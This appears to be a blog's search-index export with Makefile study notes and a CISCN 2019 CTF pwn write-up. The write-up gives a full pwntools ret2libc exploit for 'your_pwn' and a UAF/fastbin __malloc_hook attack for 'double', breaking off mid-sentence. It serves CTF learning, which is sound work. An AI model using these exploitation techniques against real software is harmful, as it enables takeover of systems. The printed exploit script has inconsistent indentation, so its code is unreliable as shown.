<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Makefile学习记录</title>
      <link href="/2019/05/14/Makefile%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/05/14/Makefile%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>记录遇到的Makefile语法和规则。</p><p>大部分摘自<a href="http://scc.qibebt.cas.cn/docs/linux/base/%B8%FA%CE%D2%D2%BB%C6%F0%D0%B4Makefile-%B3%C2%F0%A9.pdf" target="_blank" rel="noopener">《跟我一起写Makefile》——陈皓</a><br><a id="more"></a></p><h1 id="makefile规则"><a href="#makefile规则" class="headerlink" title="makefile规则"></a>makefile规则</h1><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target ... : prerequisites</span><br><span class="line">command</span><br></pre></td></tr></table></figure><p>简单来说，target可以是目标文件，可执行文件，你想生成的文件，或者标签等等。prerequisites是生成target所需要的文件或目标。command就是生成target的命令，也就是make实实在在执行的命令。</p><p>这个三个参数列出来之后我们就有了一个相互依赖的关系：target这个(或多个)目标文件会依赖于prerequisites中的文件，生成规则定义在command中。也就是说如果prerequisites中有文件比target中的文件新的话，command里定义的命令就会执行。</p><p><strong>示例</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit : main.o kbd.o command.o display.o \  </span><br><span class="line">insert.o search.o files.o utils.o  </span><br><span class="line">cc -o edit main.o kbd.o command.o display.o \  </span><br><span class="line">insert.o search.o files.o utils.o</span><br></pre></td></tr></table></figure><h1 id="foreach函数"><a href="#foreach函数" class="headerlink" title="foreach函数"></a>foreach函数</h1><p>foreach用作循环，语法：</p><p><strong>$(foreach <var>,<list>,<text>)</text></list></var></strong></p><blockquote><p>这个函数的意思是，把参数<list>中的单词逐一取出放到参数<var>所指定的变量中， 然后再执行<text>所包含的表达式。每一次<text>会返回一个字符串，循环过程中，<text> 的所返回的每个字符串会以空格分隔，后当整个循环结束时，<text>所返回的每个字符串 所组成的整个字符串（以空格分隔）将会是 foreach 函数的返回值。  </text></text></text></text></var></list></p></blockquote><p>所以，<var>好是一个变量名，<list>可以是一个表达式，而<text>中一般会使用<var> 这个参数来依次枚举<list>中的单词。</list></var></text></list></var></p><p><strong>示例</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names := a b c d</span><br><span class="line"></span><br><span class="line">files := <span class="variable">$(<span class="built_in">foreach</span> n,<span class="variable">$(names)</span>,<span class="variable">$(n)</span>.o)</span></span><br></pre></td></tr></table></figure><p>上面的例子中，$(name)中的单词会被挨个取出，并存到变量“n”中，“$(n).o”每次 根据“$(n)”计算出一个值，这些值以空格分隔，后作为 foreach 函数的返回，所以， $(files)的值是“a.o b.o c.o d.o”。  </p><p>注意，foreach 中的<var>参数是一个临时的局部变量，foreach 函数执行完后，参数 <var>的变量将不在作用，其作用域只在 foreach 函数当中。</var></var></p>]]></content>
      
      
      
        <tags>
            
            <tag> makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2019线上赛-pwn</title>
      <link href="/2019/04/22/ciscn2019%E7%BA%BF%E4%B8%8A/"/>
      <url>/2019/04/22/ciscn2019%E7%BA%BF%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<p>大伙儿都来打比赛了，我也来凑凑热闹。</p><a id="more"></a><p>第一天跟第一个pwn题磕了一下午，始终没注意到脚本某个地方出了一点问题，导致始终得不到回显，然后卡了半天，晚上终于搞出来了。但是比赛结束之后反思了一下做题时整个思路，发现其实并不是很通畅，而且最后脚本出奇的冗长，无法直视。。。寻思着绝对还有更简单的解法，膜一下开赛5分钟就pwn掉的大佬。</p><h1 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h1><p>docker环境：<strong>muirelle/ciscn2019:your_pwn</strong></p><p>解题过程：<strong>栈溢出-&gt;劫持程序流程-&gt;泄露pie-&gt;泄露got表-&gt;泄露libc-&gt;计算system&amp;binsh偏移-&gt;loop-&gt;栈溢出-&gt;ret2libc-&gt;get shell</strong></p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><hr><p><img src="https://i.imgur.com/0qvPFbV.png" alt=""></p><p>保护基本都开了</p><p><img src="https://i.imgur.com/DdK6gVc.png" alt=""><br>进main函数看看，似乎溢出不了，那就去sub_b35看看</p><p><img src="https://i.imgur.com/thFcSJq.png" alt=""></p><p>简单分析一下，可以发现在17行和20行程序直接给我们提供了可重复利用的栈任意位置读写功能。控制v1可以读取(v4+v1)所指向内容的值。控制v2可以将v2的值写入(v4+v1)对应的地址。但是注意一点，一次只能读取和写入一字节的数据。</p><p>结合程序开的保护，最后选ret2libc。</p><p>简单的计算一下偏移之后，就可以直接劫持函数流了。</p><p>所以按照一开始的思路，一步一步往后做就行了。在本地测试的时候，每次只返回一个字节没错，但连上服务器再测试却会随机返回多于一个字节的数据，让我停在这个地方想了半天原因，多次测试之后才发现：如果本应返回3b这个数据，结果却返回了ffffff3b的话，可以直接无视掉前面的f，只取最低位一个字节就行了。不知道为啥会这样。。。</p><h2 id="思路历程"><a href="#思路历程" class="headerlink" title="思路历程"></a>思路历程</h2><hr><p>由于程序提供了puts，所以可以用puts来打印got表的内容从而泄露libc。前提是要先得到puts的地址才能调用它。由于程序开了pie保护，所以我们最初只能拿到代码段的地址偏移，但是通过程序自带的栈内容泄露功能，我们可以直接泄露出函数的返回地址，从而得到代码段的真实地址</p><h3 id="index-value"><a href="#index-value" class="headerlink" title="index_value"></a>index_value</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_value</span><span class="params">(index,value=<span class="number">-1</span>)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'index\n'</span>)</span><br><span class="line">    r.sendline(index)</span><br><span class="line">    r.recvuntil(<span class="string">'(hex) '</span>)</span><br><span class="line">    v = int(r.recvuntil(<span class="string">'value\n'</span>).split(<span class="string">'\n'</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">'value: '</span>+hex(v))</span><br><span class="line">    <span class="keyword">if</span> (value==<span class="number">-1</span>):</span><br><span class="line">        r.sendline(str(v))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendline(str(int(value,<span class="number">16</span>)))</span><br><span class="line">        log.info(<span class="string">'change to: '</span>+hex(int(value,<span class="number">16</span>)))</span><br><span class="line">    <span class="keyword">return</span> v</span><br></pre></td></tr></table></figure><p>先写一个函数便于利用程序的读写功能。</p><h3 id="leak-ret"><a href="#leak-ret" class="headerlink" title="leak_ret"></a>leak_ret</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ret_0 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'344'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">ret_1 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'345'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">ret_2 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'346'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">ret_3 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'347'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">ret_4 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'348'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">ret_5 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'349'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">ret =  ret_5 + ret_4 + ret_3 + ret_2 + ret_1 + ret_0</span><br><span class="line">ret = ret.encode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><p>泄露六次可以得到完整的地址。</p><h3 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置rop链</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ROP_1:pop_rdi_ret: 0xd03</span></span><br><span class="line">index_value(<span class="string">'344'</span>,<span class="string">'3'</span>)</span><br><span class="line">index_value(<span class="string">'345'</span>,ret[<span class="number">-4</span>:<span class="number">-3</span>]+<span class="string">'d'</span>)</span><br><span class="line"></span><br><span class="line">puts_off = <span class="number">0x20176a</span></span><br><span class="line">puts_got_plt = hex(int(ret[:<span class="number">-3</span>]+<span class="string">'8b6'</span>,<span class="number">16</span>)+puts_off)</span><br><span class="line">    log.success(<span class="string">'puts_got_plt: '</span>+puts_got_plt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP_2:leak_puts_addr</span></span><br><span class="line">index_value(<span class="string">'352'</span>,puts_got_plt[<span class="number">-2</span>:])</span><br><span class="line">index_value(<span class="string">'353'</span>,puts_got_plt[<span class="number">-4</span>:<span class="number">-2</span>])</span><br><span class="line">index_value(<span class="string">'354'</span>,puts_got_plt[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">index_value(<span class="string">'355'</span>,puts_got_plt[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">index_value(<span class="string">'356'</span>,puts_got_plt[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">index_value(<span class="string">'357'</span>,puts_got_plt[<span class="number">-12</span>:<span class="number">-10</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP_3:ret_to_puts</span></span><br><span class="line">index_value(<span class="string">'360'</span>,<span class="string">'b0'</span>)</span><br><span class="line">index_value(<span class="string">'361'</span>,ret[<span class="number">-4</span>:<span class="number">-3</span>]+<span class="string">'8'</span>)</span><br><span class="line">index_value(<span class="string">'362'</span>,ret[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">index_value(<span class="string">'363'</span>,ret[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">index_value(<span class="string">'364'</span>,ret[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">index_value(<span class="string">'365'</span>,ret[<span class="number">-12</span>:<span class="number">-10</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_out_of_the_cycle</span></span><br><span class="line">index_value(<span class="string">'-4'</span>,<span class="string">'28'</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#calc_system&amp;binsh</span></span><br><span class="line">r.sendline(<span class="string">'yes\n'</span>)<span class="comment">#mind recving the '\n'</span></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">'name:'</span>)[<span class="number">1</span>:<span class="number">7</span>]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.success(<span class="string">'puts_addr: '</span>+hex(puts_addr))</span><br><span class="line">libc_base = puts_addr - puts_libc_off</span><br><span class="line"></span><br><span class="line">system_addr = system_off + libc_base</span><br><span class="line">binsh_addr = binsh_off + libc_base</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'system_addr: '</span>+hex(system_addr))</span><br><span class="line">log.success(<span class="string">'binsh_addr: '</span>+hex(binsh_addr))</span><br><span class="line">r.sendline(<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure><p>然后再通过已知偏移计算出puts位于plt表的位置，接着调用puts，泄露got表。</p><p><img src="https://i.imgur.com/gufNsW6.png" alt=""><br>got表相对于plt的偏移可以直接调试找到。</p><h3 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ROP_4:loop</span></span><br><span class="line">index_value(<span class="string">'368'</span>,<span class="string">'dd'</span>)</span><br><span class="line">index_value(<span class="string">'369'</span>,ret[<span class="number">-4</span>:<span class="number">-3</span>]+<span class="string">'a'</span>)</span><br><span class="line">index_value(<span class="string">'370'</span>,ret[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">index_value(<span class="string">'371'</span>,ret[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">index_value(<span class="string">'372'</span>,ret[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">index_value(<span class="string">'373'</span>,ret[<span class="number">-12</span>:<span class="number">-10</span>])</span><br></pre></td></tr></table></figure><p>测试得到了libc之后就可以在ROP链后面添加loop，回到main，然后ret2libc。</p><h2 id="完整exploit"><a href="#完整exploit" class="headerlink" title="完整exploit"></a>完整exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com'</span>,<span class="number">57856</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0xd03</span></span><br><span class="line">puts_plt = <span class="number">0x8b0</span></span><br><span class="line">printf_plt = <span class="number">0x8e0</span></span><br><span class="line">puts_off = <span class="number">0x20176a</span></span><br><span class="line">system_off = <span class="number">0x45390</span></span><br><span class="line">binsh_off = <span class="number">0x18cd57</span></span><br><span class="line">puts_libc_off = <span class="number">0x6f690</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(s)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">    r.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_value</span><span class="params">(index,value=<span class="number">-1</span>)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'index\n'</span>)</span><br><span class="line">    r.sendline(index)</span><br><span class="line">    r.recvuntil(<span class="string">'(hex) '</span>)</span><br><span class="line">    v = int(r.recvuntil(<span class="string">'value\n'</span>).split(<span class="string">'\n'</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">'value: '</span>+hex(v))</span><br><span class="line">    <span class="keyword">if</span> (value==<span class="number">-1</span>):</span><br><span class="line">        r.sendline(str(v))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendline(str(int(value,<span class="number">16</span>)))</span><br><span class="line">        log.info(<span class="string">'change to: '</span>+hex(int(value,<span class="number">16</span>)))</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    name(<span class="string">'d'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_ret_value</span></span><br><span class="line">    ret_0 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'344'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">    ret_1 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'345'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">    ret_2 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'346'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">    ret_3 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'347'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">    ret_4 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'348'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">    ret_5 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'349'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">    ret =  ret_5 + ret_4 + ret_3 + ret_2 + ret_1 + ret_0</span><br><span class="line">    ret = ret.encode(<span class="string">'hex'</span>)</span><br><span class="line">    log.success(<span class="string">'ret: '</span>+ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP_1:pop_rdi_ret: 0xd03</span></span><br><span class="line">index_value(<span class="string">'344'</span>,<span class="string">'3'</span>)</span><br><span class="line">index_value(<span class="string">'345'</span>,ret[<span class="number">-4</span>:<span class="number">-3</span>]+<span class="string">'d'</span>)</span><br><span class="line"></span><br><span class="line">puts_off = <span class="number">0x20176a</span></span><br><span class="line">puts_got_plt = hex(int(ret[:<span class="number">-3</span>]+<span class="string">'8b6'</span>,<span class="number">16</span>)+puts_off)</span><br><span class="line">log.success(<span class="string">'puts_got_plt: '</span>+puts_got_plt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP_2:leak_puts_addr</span></span><br><span class="line">index_value(<span class="string">'352'</span>,puts_got_plt[<span class="number">-2</span>:])</span><br><span class="line">index_value(<span class="string">'353'</span>,puts_got_plt[<span class="number">-4</span>:<span class="number">-2</span>])</span><br><span class="line">index_value(<span class="string">'354'</span>,puts_got_plt[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">index_value(<span class="string">'355'</span>,puts_got_plt[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">index_value(<span class="string">'356'</span>,puts_got_plt[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">index_value(<span class="string">'357'</span>,puts_got_plt[<span class="number">-12</span>:<span class="number">-10</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP_3:ret_to_puts</span></span><br><span class="line">index_value(<span class="string">'360'</span>,<span class="string">'b0'</span>)</span><br><span class="line">index_value(<span class="string">'361'</span>,ret[<span class="number">-4</span>:<span class="number">-3</span>]+<span class="string">'8'</span>)</span><br><span class="line">index_value(<span class="string">'362'</span>,ret[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">index_value(<span class="string">'363'</span>,ret[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">index_value(<span class="string">'364'</span>,ret[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">index_value(<span class="string">'365'</span>,ret[<span class="number">-12</span>:<span class="number">-10</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_out_of_the_cycle</span></span><br><span class="line">index_value(<span class="string">'-4'</span>,<span class="string">'28'</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#calc_system&amp;binsh</span></span><br><span class="line">r.sendline(<span class="string">'yes\n'</span>)<span class="comment">#mind recving the '\n'</span></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">'name:'</span>)[<span class="number">1</span>:<span class="number">7</span>]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.success(<span class="string">'puts_addr: '</span>+hex(puts_addr))</span><br><span class="line">libc_base = puts_addr - puts_libc_off</span><br><span class="line"></span><br><span class="line">system_addr = system_off + libc_base</span><br><span class="line">binsh_addr = binsh_off + libc_base</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'system_addr: '</span>+hex(system_addr))</span><br><span class="line">log.success(<span class="string">'binsh_addr: '</span>+hex(binsh_addr))</span><br><span class="line">r.sendline(<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#new_ROP_1:pop_rdi_ret</span></span><br><span class="line">    index_value(<span class="string">'344'</span>,<span class="string">'3'</span>)</span><br><span class="line">    index_value(<span class="string">'345'</span>,ret[<span class="number">-4</span>:<span class="number">-3</span>]+<span class="string">'d'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#new_ROP_2:binsh</span></span><br><span class="line"></span><br><span class="line">    index_value(<span class="string">'352'</span>,hex(binsh_addr)[<span class="number">-2</span>:])</span><br><span class="line">    index_value(<span class="string">'353'</span>,hex(binsh_addr)[<span class="number">-4</span>:<span class="number">-2</span>])</span><br><span class="line">    index_value(<span class="string">'354'</span>,hex(binsh_addr)[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">    index_value(<span class="string">'355'</span>,hex(binsh_addr)[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">    index_value(<span class="string">'356'</span>,hex(binsh_addr)[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">    index_value(<span class="string">'357'</span>,hex(binsh_addr)[<span class="number">-12</span>:<span class="number">-10</span>])</span><br><span class="line">   <span class="comment"># index_value('358','0')</span></span><br><span class="line">   <span class="comment"># index_value('359','0')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#new_ROP_3:system</span></span><br><span class="line">    index_value(<span class="string">'360'</span>,hex(system_addr)[<span class="number">-2</span>:])</span><br><span class="line">    index_value(<span class="string">'361'</span>,hex(system_addr)[<span class="number">-4</span>:<span class="number">-2</span>])</span><br><span class="line">    index_value(<span class="string">'362'</span>,hex(system_addr)[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">    index_value(<span class="string">'363'</span>,hex(system_addr)[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">    index_value(<span class="string">'364'</span>,hex(system_addr)[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">    index_value(<span class="string">'365'</span>,hex(system_addr)[<span class="number">-12</span>:<span class="number">-10</span>])</span><br><span class="line">   <span class="comment"># index_value('366','0')</span></span><br><span class="line">   <span class="comment"># index_value('367','0')</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    index_value(<span class="string">'-4'</span>,<span class="string">'28'</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">'yes\n'</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>被卡很久的原因就是在一开始输入名字的时候我随便填了一个很长的字符串，而这个字符串刚好在我放置rop链的地方，并且构造rop链时偷懒，没有覆盖全8个字节，所以字符串的高字节部分没有被覆盖为0，导致rop失败。。。</p><h1 id="double"><a href="#double" class="headerlink" title="double"></a>double</h1><p>docker环境：<strong>muirelle/ciscn2019:double</strong></p><p><strong>利用main_arena泄露libc。然后fastbin attack：把malloc_hook的值覆盖为one_gadget，最后getshell</strong></p><h2 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h2><p>通过运行程序可以看出程序提供新建，显示，编辑，删除信息这四个功能，查看堆可以看到管理每个信息的结构体：</p><p><img src="https://i.imgur.com/Qrw6BA0.png" alt=""></p><p>得到的结构体大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span>&#123;</span></span><br><span class="line">int32 index;</span><br><span class="line">int32 len;</span><br><span class="line"><span class="keyword">char</span> *content;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak_libc"></a>leak_libc</h2><p><img src="https://i.imgur.com/nhz1s1h.png" alt=""><br>找到new_info函数中存在UAF漏洞。红框中的代码判断即将申请的info-&gt;content是否和最近申请的info-&gt;content相同，如果是的话就不再申请新的chunk，而是直接将新的info.content指向最近申请的chunk，由于两个指针指向同一个chunk，所以造成UAF漏洞。</p><p>利用方法：申请两个内容相同的chunk，大小超过fastbin，先free掉一个chunk，其fd,bk被置为main_arena+88后打印另一个chunk，可以泄露出main_arena的值，结合libc基址，相减计算出偏移。</p><p>通过gdb.attach()可以在泄露出main_arena的同时得到libc的基址。相减得到偏移，用于计算libc基址来绕过aslr。</p><p><img src="https://i.imgur.com/RKgfkKv.png" alt=""></p><h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>利用同一个漏洞。先申请两个相同的chunk，free掉其中一个后，edit另外一个chunk可以修改存在于fastbin中chunk的fd值，从而在下一次malloc时返回我们想要的地址指针，进而实现任意地址写。</p><p>现在我们有了libc地址，所以问题是在什么地方写可以拿到shell？这里有个知识点是覆盖<strong>__malloc_hook</strong>。</p><blockquote><p>__malloc_hook是一个函数指针，如果该指针不为空，则在调用malloc时会调用它。</p></blockquote><p>__malloc_hook位于main_arena上方：</p><p><img src="https://i.imgur.com/TTxFGgR.png" alt=""></p><p>所以我们的目标是利用libc得到one_gadget，然后将one_gadget放在__malloc_hook上，之后再调用malloc就会直接跳转到one_gadget，从而getshell。</p><p>所以现在需要构造一个fake chunk并且__malloc_hook要位于这个fake chunk的可控数据部分。我们不能直接把0x7f3bc9f52b00(以上图为例)作为fake 